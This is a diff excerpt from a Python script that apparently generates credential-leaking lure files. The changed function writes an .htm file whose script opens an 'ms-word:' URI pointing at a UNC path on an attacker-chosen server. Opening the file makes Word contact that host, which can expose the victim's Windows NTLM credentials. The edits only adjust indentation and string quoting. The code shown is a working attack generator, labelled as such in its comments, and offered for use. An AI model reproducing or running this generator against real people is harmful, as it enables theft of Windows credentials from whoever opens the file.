@@ -161,15 +161,15 @@ def create_htm(generate,server,filename):
 # .htm with rlocal handler attack
 # Filename: shareattack-(handler).htm, action=open, attacks=open in web browser, will automatically open word
 def create_htm_handler(generate,server,filename):
-	file = open(filename,'w')
-	file.write('''<!DOCTYPE html>
+    file = open(filename,'w')
+    file.write(r'''<!DOCTYPE html>
 <html>
-	<script>
-		location.href = 'ms-word:ofe|u|\\''' + server + '''\\leak\\leak.docx';
-	</script>
+    <script>
+        location.href = 'ms-word:ofe|u|\\''' + server + r'''\leak\leak.docx';
+    </script>
 </html>''')
-	file.close()
-	print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
+    file.close()
+    print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
 
 # .docx file with remote includepicture field attack
 def create_docx_includepicture(generate,server,filename):
@@ -666,3 +666,4 @@ elif(args.generate == "theme"):
 	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
 
 print("Generation Complete.")
+
